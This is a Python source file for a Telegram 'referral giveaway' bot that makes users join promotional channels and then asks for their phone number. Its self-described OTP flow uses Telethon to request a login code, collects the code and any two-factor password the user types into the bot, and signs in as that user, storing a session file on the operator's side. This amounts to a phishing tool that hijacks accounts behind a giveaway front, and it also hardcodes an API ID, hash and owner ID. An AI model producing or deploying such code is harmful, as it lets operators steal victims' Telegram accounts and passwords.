# language: Python, file: bot.py, runtime: Python 3.10+, library: python-telegram-bot v21, telethon

import sqlite3
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ChatMemberHandler
)
from telegram.constants import ChatMemberStatus
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError

# --- CONFIGURATION ---
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE" # Get from BotFather
OWNER_ID = 8646237754
BOT_USERNAME = "YourBotUsername" # Put your bot's username here without the @ (e.g. "MyReferBot")

# API CREDENTIALS FROM YOUR SCREENSHOT
API_ID = 34540299
API_HASH = "ed6fec574eb38bd1d60facca6ea360e2"

DEFAULT_CHANNELS = [
    "https://t.me/trusteddealers07",
    "https://t.me/trustmebaby07",
    "https://t.me/trusteddealers_07",
    "https://t.me/giveawaypower"
]

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# --- DATABASE SETUP ---
def init_db():
    conn = sqlite3.connect("referral_bot.db")
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    phone TEXT,
                    country TEXT,
                    refer_count INTEGER DEFAULT 0,
                    coins INTEGER DEFAULT 0,
                    referrer_id INTEGER DEFAULT NULL
                )''')
    c.execute('''CREATE TABLE IF NOT EXISTS giveaway_pool (
                    slot_id INTEGER PRIMARY KEY AUTOINCREMENT,
                    id_string TEXT,
                    required_refers INTEGER DEFAULT 100,
                    claimed_by INTEGER DEFAULT NULL
                )''')
    c.execute('''CREATE TABLE IF NOT EXISTS channels (
                    url TEXT PRIMARY KEY
                )''')
    
    c.execute("SELECT COUNT(*) FROM giveaway_pool")
    if c.fetchone()[0] == 0:
        c.executemany("INSERT INTO giveaway_pool (id_string, required_refers) VALUES (?, ?)", [("EMPTY", 100)] * 100)
        
    c.execute("SELECT COUNT(*) FROM channels")
    if c.fetchone()[0] == 0:
        for url in DEFAULT_CHANNELS:
            c.execute("INSERT INTO channels (url) VALUES (?)", (url,))
            
    conn.commit()
    conn.close()

init_db()

def get_db():
    return sqlite3.connect("referral_bot.db")

# --- HELPER FUNCTIONS ---
def get_channels_list():
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT url FROM channels")
    channels = [row[0] for row in c.fetchall()]
    conn.close()
    return channels

async def check_membership(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> list:
    channels = get_channels_list()
    missing = []
    for ch in channels:
        chat_id = ch.replace("https://t.me/", "@")
        try:
            member = await context.bot.get_chat_member(chat_id=chat_id, user_id=user_id)
            if member.status in [ChatMemberStatus.LEFT, ChatMemberStatus.KICKED]:
                missing.append(ch)
        except Exception as e:
            logger.error(f"Error checking {chat_id}: {e}")
    return missing

def get_join_keyboard():
    channels = get_channels_list()
    keyboard = []
    for i in range(0, len(channels), 2):
        row = [InlineKeyboardButton(f"Join {i+1}", url=channels[i])]
        if i + 1 < len(channels):
            row.append(InlineKeyboardButton(f"Join {i+2}", url=channels[i+1]))
        keyboard.append(row)
    keyboard.append([InlineKeyboardButton("✅ Verify & Continue", callback_data="verify_join")])
    return InlineKeyboardMarkup(keyboard)

def main_menu_keyboard(user_id):
    kb = [
        [InlineKeyboardButton("📊 My Profile", callback_data="profile"), InlineKeyboardButton("🏆 Leaderboard", callback_data="leaderboard")],
        [InlineKeyboardButton("🎁 Giveaway Claim", callback_data="claim_menu")]
    ]
    if user_id == OWNER_ID:
        kb.append([InlineKeyboardButton("⚙️ Owner Panel", callback_data="admin_panel")])
    return InlineKeyboardMarkup(kb)

# --- START & FLOW ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "NoUsername"
    
    if context.args and 'referred_processed' not in context.user_data:
        referrer_id = context.args[0]
        if referrer_id.isdigit():
            referrer_id = int(referrer_id)
            if referrer_id != user_id:
                conn = get_db()
                c = conn.cursor()
                c.execute("SELECT referrer_id FROM users WHERE user_id = ?", (user_id,))
                row = c.fetchone()
                if not row:
                    c.execute("INSERT OR IGNORE INTO users (user_id, username, referrer_id) VALUES (?, ?, ?)", (user_id, username, referrer_id))
                    c.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (referrer_id, "Referrer"))
                    c.execute("UPDATE users SET refer_count = refer_count + 1, coins = coins + 1 WHERE user_id = ?", (referrer_id,))
                    conn.commit()
                    context.user_data['referred_processed'] = True
                    try:
                        await context.bot.send_message(referrer_id, f"🎁 New Referral! You gained 1 refer and 1 coin.")
                    except: pass
                conn.close()

    missing = await check_membership(user_id, context)
    if missing:
        await update.message.reply_text("🚨 You must join all required channels to use this bot.", reply_markup=get_join_keyboard())
        return

    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT phone FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()

    if not row or not row[0]:
        await update.message.reply_text("📱 Please enter your phone number with country code to receive a Telegram OTP (e.g., `+919876543210`):", parse_mode="Markdown")
        context.user_data['awaiting_phone'] = True
        return

    await update.message.reply_text(
        f"👋 **Welcome, {update.effective_user.first_name}!**\n\nUse the menu below:",
        parse_mode="Markdown",
        reply_markup=main_menu_keyboard(user_id)
    )

async def verify_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    missing = await check_membership(user_id, context)
    if missing:
        await query.edit_message_text(f"❌ You are still missing: {', '.join(missing)}", reply_markup=get_join_keyboard())
    else:
        await query.edit_message_text("✅ Verified! Type /start to continue.")

# --- REAL OTP FLOW (TELETHON) ---
async def process_phone(update: Update, context: ContextTypes.DEFAULT_TYPE, phone: str):
    user_id = update.effective_user.id
    phone = phone.replace(" ", "")
    
    await update.message.reply_text("⏳ Requesting OTP from Telegram... Please wait.")
    
    session_name = f"session_{user_id}"
    client = TelegramClient(session_name, API_ID, API_HASH)
    
    try:
        await client.connect()
        if not await client.is_user_authorized():
            sent_code = await client.send_code_request(phone)
            context.user_data['phone_code_hash'] = sent_code.phone_code_hash
            context.user_data['login_phone'] = phone
            
            conn = get_db()
            c = conn.cursor()
            c.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user_id, update.effective_user.username or ""))
            c.execute("UPDATE users SET phone = ? WHERE user_id = ?", (phone, user_id))
            conn.commit()
            conn.close()
            
            await update.message.reply_text("🔐 OTP sent! Please enter the code you just received on Telegram:")
            context.user_data['awaiting_otp'] = True
        else:
            await update.message.reply_text("✅ This phone is already logged in.")
            context.user_data['awaiting_country'] = True
            await update.message.reply_text("🌍 Enter your Country:")
    except Exception as e:
        logger.error(f"Phone Error: {e}")
        await update.message.reply_text(f"❌ Error: {str(e)}\nMake sure the phone number is correct and active.")
    finally:
        await client.disconnect()

async def process_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, code: str):
    user_id = update.effective_user.id
    phone = context.user_data.get('login_phone')
    phone_code_hash = context.user_data.get('phone_code_hash')
    
    if not phone or not phone_code_hash:
        await update.message.reply_text("❌ Session expired. Please type /start again.")
        return
        
    await update.message.reply_text("⏳ Verifying OTP...")
    
    session_name = f"session_{user_id}"
    client = TelegramClient(session_name, API_ID, API_HASH)
    
    try:
        await client.connect()
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        
        await update.message.reply_text("✅ OTP Verified successfully!")
        context.user_data['awaiting_otp'] = False
        context.user_data['awaiting_country'] = True
        await update.message.reply_text("🌍 Enter your Country:")
        
    except SessionPasswordNeededError:
        await update.message.reply_text("🔑 2FA is enabled. Please enter your password:")
        context.user_data['awaiting_2fa'] = True
    except Exception as e:
        logger.error(f"OTP Error: {e}")
        await update.message.reply_text(f"❌ Error: {str(e)}\nThe code might be incorrect or expired.")
    finally:
        await client.disconnect()

async def process_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE, password: str):
    user_id = update.effective_user.id
    session_name = f"session_{user_id}"
    client = TelegramClient(session_name, API_ID, API_HASH)
    
    try:
        await client.connect()
        await client.sign_in(password=password)
        await update.message.reply_text("✅ 2FA Verified successfully!")
        context.user_data['awaiting_2fa'] = False
        context.user_data['awaiting_country'] = True
        await update.message.reply_text("🌍 Enter your Country:")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    finally:
        await client.disconnect()

# --- MESSAGE HANDLER ---
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    # --- OWNER PANEL INPUTS ---
    if user_id == OWNER_ID:
        action = context.user_data.get('admin_action')
        
        if action == 'add_id':
            try:
                slot, id_str, req_refers = text.split(" ", 2)
                conn = get_db()
                c = conn.cursor()
                c.execute("UPDATE giveaway_pool SET id_string = ?, required_refers = ?, claimed_by = NULL WHERE slot_id = ?", (id_str, int(req_refers), int(slot)))
                conn.commit()
                conn.close()
                await update.message.reply_text(f"✅ Slot {slot} set to `{id_str}` requiring {req_refers} refers.")
            except Exception:
                await update.message.reply_text("Format: `<slot_number> <id_string> <required_refers>` (e.g., `1 my_id_123 100`)")
            context.user_data['admin_action'] = None
            return

        elif action == 'broadcast':
            channels = get_channels_list()
            success = 0
            for ch in channels:
                try:
                    await context.bot.send_message(chat_id=ch.replace("https://t.me/", "@"), text=text)
                    success += 1
                except: pass
            await update.message.reply_text(f"✅ Broadcast sent to {success}/{len(channels)} channels.")
            context.user_data['admin_action'] = None
            return
            
        elif action == 'add_ch':
            conn = get_db()
            c = conn.cursor()
            c.execute("INSERT OR IGNORE INTO channels (url) VALUES (?)", (text,))
            conn.commit()
            conn.close()
            await update.message.reply_text(f"✅ Added channel: {text}")
            context.user_data['admin_action'] = None
            return
            
        elif action == 'add_refer':
            try:
                target_id, amount = text.split(" ")
                target_id, amount = int(target_id), int(amount)
                conn = get_db()
                c = conn.cursor()
                c.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (target_id,))
                c.execute("UPDATE users SET refer_count = refer_count + ?, coins = coins + ? WHERE user_id = ?", (amount, amount, target_id))
                conn.commit()
                conn.close()
                await update.message.reply_text(f"✅ Added {amount} refers/coins to `{target_id}`.")
            except Exception:
                await update.message.reply_text("Format: `<user_id> <amount>` (e.g., `123456789 5`)")
            context.user_data['admin_action'] = None
            return
            
        elif action == 'remove_refer':
            try:
                target_id, amount = text.split(" ")
                target_id, amount = int(target_id), int(amount)
                conn = get_db()
                c = conn.cursor()
                c.execute("UPDATE users SET refer_count = MAX(0, refer_count - ?), coins = MAX(0, coins - ?) WHERE user_id = ?", (amount, amount, target_id))
                conn.commit()
                conn.close()
                await update.message.reply_text(f"✅ Removed {amount} refers/coins from `{target_id}`.")
            except Exception:
                await update.message.reply_text("Format: `<user_id> <amount>` (e.g., `123456789 5`)")
            context.user_data['admin_action'] = None
            return

    # --- USER OTP FLOW ---
    if context.user_data.get('awaiting_phone'):
        context.user_data['awaiting_phone'] = False
        await process_phone(update, context, text)
        return

    if context.user_data.get('awaiting_otp'):
        await process_otp(update, context, text)
        return

    if context.user_data.get('awaiting_2fa'):
        await process_2fa(update, context, text)
        return

    if context.user_data.get('awaiting_country'):
        conn = get_db()
        c = conn.cursor()
        c.execute("UPDATE users SET country = ? WHERE user_id = ?", (text, user_id))
        conn.commit()
        conn.close()
        context.user_data['awaiting_country'] = False
        await update.message.reply_text("✅ Profile setup complete! Welcome.", reply_markup=main_menu_keyboard(user_id))
        return

# --- REST OF THE UI (PROFILE, LEADERBOARD, CLAIM, ADMIN PANEL) ---
async def show_profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT username, refer_count, coins, phone, country FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    
    c.execute("SELECT id_string, required_refers FROM giveaway_pool WHERE claimed_by = ?", (user_id,))
    claimed = c.fetchall()
    conn.close()
    
    claimed_text = "None"
    if claimed:
        claimed_text = "\n".join([f"`{x[0]}` (Hit {x[1]} refers)" for x in claimed])
    
    text = (
        f"👤 **Your Profile**\n\n"
        f"🆔 ID: `{user_id}`\n"
        f"🏷 Username: @{row[0] if row and row[0] else 'None'}\n"
        f"📱 Phone: {row[3] if row and row[3] else 'Not set'}\n"
        f"🌍 Country: {row[4] if row and row[4] else 'Not set'}\n\n"
        f"🔗 Referrals: {row[1] if row else 0}\n"
        f"🪙 Coins: {row[2] if row else 0}\n"
        f"🎁 Claimed IDs:\n{claimed_text}"
    )
    
    ref_link = f"https://t.me/{BOT_USERNAME}?start={user_id}"
    
    kb = [
        [InlineKeyboardButton("🔗 Copy Referral Link", url=ref_link)],
        [InlineKeyboardButton("⬅️ Back", callback_data="back_main")]
    ]
    await query.edit_message_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))

async def show_leaderboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT user_id, refer_count FROM users ORDER BY refer_count DESC LIMIT 10")
    rows = c.fetchall()
    conn.close()
    
    text = "🏆 **Top 10 Leaderboard**\n\n"
    for i, row in enumerate(rows, 1):
        text += f"{i}. `{row[0]}` — {row[1]} refers\n"
    if not rows: text += "No referrals yet."
        
    await query.edit_message_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="back_main")]]))

async def claim_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT refer_count FROM users WHERE user_id = ?", (user_id,))
    user_refers = c.fetchone()[0]
    
    c.execute("SELECT slot_id, id_string, required_refers FROM giveaway_pool WHERE claimed_by IS NULL AND required_refers <= ? ORDER BY slot_id ASC", (user_refers,))
    available = c.fetchall()
    conn.close()
    
    if not available:
        await query.edit_message_text("❌ No giveaway IDs available for your refer count yet. Keep referring!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="back_main")]]))
        return
        
    kb = []
    for slot in available:
        kb.append([InlineKeyboardButton(f"Claim ID: {slot[1]} ({slot[2]} refs)", callback_data=f"claim_{slot[0]}")])
    kb.append([InlineKeyboardButton("⬅️ Back", callback_data="back_main")])
    
    await query.edit_message_text("🎁 **Available Giveaway IDs:**\nClick one to claim it.", reply_markup=InlineKeyboardMarkup(kb))

async def process_claim(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    slot_id = int(query.data.split("_")[1])
    
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT refer_count FROM users WHERE user_id = ?", (user_id,))
    user_refers = c.fetchone()[0]
    
    c.execute("SELECT id_string, required_refers, claimed_by FROM giveaway_pool WHERE slot_id = ?", (slot_id,))
    slot = c.fetchone()
    
    if not slot or slot[2] is not None:
        await query.edit_message_text("❌ This ID has already been claimed.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="back_main")]]))
        conn.close()
        return
        
    if user_refers < slot[1]:
        await query.edit_message_text("❌ You don't have enough referrals for this ID.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="back_main")]]))
        conn.close()
        return
        
    c.execute("UPDATE giveaway_pool SET claimed_by = ? WHERE slot_id = ?", (user_id, slot_id))
    conn.commit()
    conn.close()
    
    await query.edit_message_text(f"🎉 **Success!**\n\nYou claimed ID: `{slot[0]}`\nRequired Refers: {slot[1]}\nYour Refers: {user_refers}", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Main Menu", callback_data="back_main")]]))

async def back_main(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("Main Menu:", reply_markup=main_menu_keyboard(query.from_user.id))

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.from_user.id != OWNER_ID: return
    
    data = query.data
    if data == "admin_panel":
        keyboard = [
            [InlineKeyboardButton("➕ Add/Edit Giveaway ID", callback_data="admin_add_id")],
            [InlineKeyboardButton("📢 Broadcast to Channels", callback_data="admin_broadcast")],
            [InlineKeyboardButton("➕ Add Channel", callback_data="admin_add_ch"), InlineKeyboardButton("➖ Remove Channel", callback_data="admin_rm_ch")],
            [InlineKeyboardButton("➕ Add Refer", callback_data="admin_add_ref"), InlineKeyboardButton("➖ Remove Refer", callback_data="admin_remove_ref")],
        ]
        await query.edit_message_text("⚙️ **Owner Panel**\nSelect an option:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        
    elif data == "admin_add_id":
        context.user_data['admin_action'] = 'add_id'
        await query.edit_message_text("Send me: `<slot_number> <id_string> <required_refers>`\nExample: `1 987654321 100`", parse_mode="Markdown")
    elif data == "admin_broadcast":
        context.user_data['admin_action'] = 'broadcast'
        await query.edit_message_text("Send me the message to broadcast to all joined channels.")
    elif data == "admin_add_ch":
        context.user_data['admin_action'] = 'add_ch'
        await query.edit_message_text("Send me the channel link (e.g., `https://t.me/yourchannel`).")
    elif data == "admin_rm_ch":
        channels = get_channels_list()
        kb = [[InlineKeyboardButton(f"❌ {ch}", callback_data=f"rmch_{ch}")] for ch in channels]
        kb.append([InlineKeyboardButton("⬅️ Back to Panel", callback_data="admin_panel")])
        await query.edit_message_text("Select channel to remove:", reply_markup=InlineKeyboardMarkup(kb))
    elif data.startswith("rmch_"):
        ch = data.replace("rmch_", "")
        conn = get_db()
        c = conn.cursor()
        c.execute("DELETE FROM channels WHERE url = ?", (ch,))
        conn.commit()
        conn.close()
        await query.edit_message_text(f"✅ Removed {ch}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back to Panel", callback_data="admin_panel")]]))
    elif data == "admin_add_ref":
        context.user_data['admin_action'] = 'add_refer'
        await query.edit_message_text("Send me: `<user_id> <amount>`\nExample: `123456789 5`", parse_mode="Markdown")
    elif data == "admin_remove_ref":
        context.user_data['admin_action'] = 'remove_refer'
        await query.edit_message_text("Send me: `<user_id> <amount>`\nExample: `123456789 5`", parse_mode="Markdown")

# --- LEAVE DETECTION ---
async def track_chats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    result = update.chat_member
    if not result: return
    
    old_status = result.old_chat_member.status
    new_status = result.new_chat_member.status
    user_id = result.new_chat_member.user.id
    
    if old_status in [ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR] and new_status in [ChatMemberStatus.LEFT, ChatMemberStatus.KICKED]:
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT referrer_id FROM users WHERE user_id = ?", (user_id,))
        row = c.fetchone()
        
        if row and row[0]:
            referrer_id = row[0]
            c.execute("UPDATE users SET refer_count = MAX(0, refer_count - 1), coins = MAX(0, coins - 1) WHERE user_id = ?", (referrer_id,))
            c.execute("UPDATE users SET referrer_id = NULL WHERE user_id = ?", (user_id,))
            conn.commit()
            try:
                await context.bot.send_message(referrer_id, f"⚠️ A user you referred (`{user_id}`) left a channel. 1 refer/coin removed.")
            except: pass
        conn.close()

# --- MAIN APPLICATION ---
def main():
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(verify_join, pattern="^verify_join$"))
    application.add_handler(CallbackQueryHandler(show_profile, pattern="^profile$"))
    application.add_handler(CallbackQueryHandler(show_leaderboard, pattern="^leaderboard$"))
    application.add_handler(CallbackQueryHandler(claim_menu, pattern="^claim_menu$"))
    application.add_handler(CallbackQueryHandler(process_claim, pattern="^claim_"))
    application.add_handler(CallbackQueryHandler(back_main, pattern="^back_main$"))
    application.add_handler(CallbackQueryHandler(admin_callback, pattern="^(admin_|rmch_)"))
    
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(ChatMemberHandler(track_chats, ChatMemberHandler.CHAT_MEMBER))

    logger.info("Bot is running...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
